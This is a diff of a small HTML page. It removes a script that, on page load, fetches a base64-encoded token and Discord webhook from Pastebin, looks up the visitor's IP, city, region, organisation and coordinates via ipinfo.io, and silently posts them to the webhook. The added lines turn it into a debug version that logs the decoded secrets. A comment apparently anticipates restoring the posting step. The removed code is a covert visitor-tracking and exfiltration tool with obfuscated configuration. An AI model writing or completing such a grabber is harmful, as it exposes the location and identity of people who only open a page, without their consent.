@@ -3,48 +3,35 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Data Fetcher</title>
+    <title>Test Script</title>
 </head>
 <body>
     <script>
-        // Pastebin link with encoded token and webhook
         const pastebinUrl = 'https://pastebin.com/raw/quyru4jf';
 
-        async function fetchDataAndSend() {
+        async function testFetchAndDecode() {
             try {
-                // Fetch encoded token and webhook from Pastebin
+                // Step 1: Fetch the encoded data from Pastebin
                 const pastebinResponse = await fetch(pastebinUrl);
                 const encodedData = await pastebinResponse.text();
+
+                // Step 2: Decode the Base64 data
                 const decodedData = atob(encodedData).split(',');
 
-                // Extract token and webhook URL
+                // Step 3: Extract and log token and webhook URL for verification
                 const token = decodedData[0];
                 const webhookUrl = decodedData[1];
+                console.log("Token:", token);        // Verify if this logs correctly
+                console.log("Webhook URL:", webhookUrl); // Verify if this logs correctly
 
-                // Fetch IP info data
-                const response = await fetch(`https://ipinfo.io/json?token=${token}`);
-                const data = await response.json();
-
-                // Prepare message payload
-                const payload = {
-                    content: `Location Data:\nIP: ${data.ip}\nCity: ${data.city}\nRegion: ${data.region}\nCountry: ${data.country}\nOrganization: ${data.org}\nCoordinates: ${data.loc}\nTimezone: ${data.timezone}`
-                };
-
-                // Send data to Discord webhook
-                await fetch(webhookUrl, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(payload)
-                });
+                // Optional: Proceed with IPinfo and webhook posting after verifying the values
             } catch (error) {
-                // Handle any errors silently
+                console.log("Error in fetching or decoding:", error);
             }
         }
 
         // Execute the function
-        fetchDataAndSend();
+        testFetchAndDecode();
     </script>
 </body>
 </html>
